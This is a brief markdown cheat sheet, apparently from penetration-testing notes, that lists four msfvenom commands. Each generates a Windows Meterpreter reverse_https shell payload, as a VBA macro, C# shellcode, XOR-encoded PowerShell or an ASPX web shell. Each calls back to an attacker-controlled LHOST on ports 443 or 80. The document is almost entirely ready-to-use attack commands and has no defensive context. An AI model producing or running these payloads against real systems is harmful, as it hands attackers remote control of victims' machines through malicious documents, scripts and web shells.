# Payloads List

## VBA Format
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f vbapplication
```
## C# Format
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=80 -f csharp##
```

## PowerShell Format
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=443 EXITFUNC=thread -e x64/xor -f ps1
```

## ASPX Format
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=443 -f aspx -o met.aspx
```
